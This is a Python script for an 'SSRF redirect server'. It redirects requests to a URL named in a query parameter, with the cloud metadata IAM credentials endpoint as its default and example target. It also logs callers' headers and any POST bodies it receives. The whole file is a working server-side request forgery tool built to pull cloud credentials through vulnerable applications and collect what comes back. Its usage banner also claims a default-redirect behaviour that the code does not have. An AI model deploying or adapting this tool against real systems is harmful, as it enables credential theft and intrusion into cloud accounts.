#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import os, sys, time

# ─── CONFIG ───────────────────────────────────────────────────────────────────
PORT        = int(os.environ.get("PORT", "8000"))
DEFAULT_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
LOG_FILE    = "redirect_log.txt"
# ──────────────────────────────────────────────────────────────────────────────

class RedirectHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        request_start = time.perf_counter()  # ← start timer

        timestamp  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip  = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "none")
        referer    = self.headers.get("Referer", "none")
        full_url   = self.path

        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if "redirect" not in params:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Hello World")
            elapsed_ms = (time.perf_counter() - request_start) * 1000
            print(f"[{timestamp}] 200 Hello World — {elapsed_ms:.2f} ms", flush=True)
            return

        dest_url = params["redirect"][0]

        # Send redirect first, then measure
        self.send_response(307)
        self.send_header("Location", dest_url)
        self.end_headers()

        elapsed_ms = (time.perf_counter() - request_start) * 1000  # ← stop timer

        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}]
  FROM       : {client_ip}
  REQUEST    : {full_url}
  REDIRECTING: {dest_url}
  USER-AGENT : {user_agent}
  REFERER    : {referer}
  TIMING     : {elapsed_ms:.2f} ms
  ALL HEADERS:
"""
        for key, val in self.headers.items():
            log_entry += f"    {key}: {val}\n"
        log_entry += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"

        print(log_entry, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

    def do_POST(self):
        request_start = time.perf_counter()  # ← start timer

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        length    = int(self.headers.get("Content-Length", 0))
        body      = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""

        self.send_response(200)
        self.end_headers()

        elapsed_ms = (time.perf_counter() - request_start) * 1000  # ← stop timer

        log_entry = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[{timestamp}] POST RECEIVED
  FROM   : {client_ip}
  PATH   : {self.path}
  BODY   : {body}
  TIMING : {elapsed_ms:.2f} ms
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        print(log_entry, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════╗
║           SSRF REDIRECT SERVER — READY               ║
╠══════════════════════════════════════════════════════╣
║  Port     : {PORT:<42}║
║  Log file : {LOG_FILE:<42}║
║  Default  : {DEFAULT_URL[:42]:<42}║
╠══════════════════════════════════════════════════════╣
║  Usage:                                              ║
║  http://YOUR_IP/?redirect=http://169.254.169.254/... ║
║  http://YOUR_IP/          ← uses default URL above   ║
╚══════════════════════════════════════════════════════╝
""")

    server = HTTPServer(("0.0.0.0", PORT), RedirectHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped.")
        sys.exit(0)